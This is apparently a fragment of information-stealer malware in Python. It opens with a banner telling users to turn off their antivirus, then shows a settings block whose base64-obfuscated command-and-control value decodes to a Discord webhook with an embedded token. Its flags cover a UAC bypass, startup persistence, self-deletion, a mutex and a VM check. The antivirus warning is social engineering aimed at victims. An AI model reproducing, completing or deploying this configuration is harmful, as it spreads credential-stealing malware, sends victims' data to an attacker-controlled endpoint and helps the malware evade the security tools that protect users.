⚠️ IMPORTANT: To use this script, you MUST disable your PC's real-time protection first! ⚠️
...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMTY3NDA0MjA2Njc5NjY3NS9kbzdnZEU1TUJwMkFTY1JLOVdqSF9fTXVaRTc2WUNiWU5oVEwtRXk5OFZjcjhUcHlCbGZ4QW4ydGdwM2lMNlphV2Z2QQ==').decode())
    Mutex = base64.b64decode('b0pxbFhjWmwzTlhsUnJOYg==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('MTk3NQ==').decode()
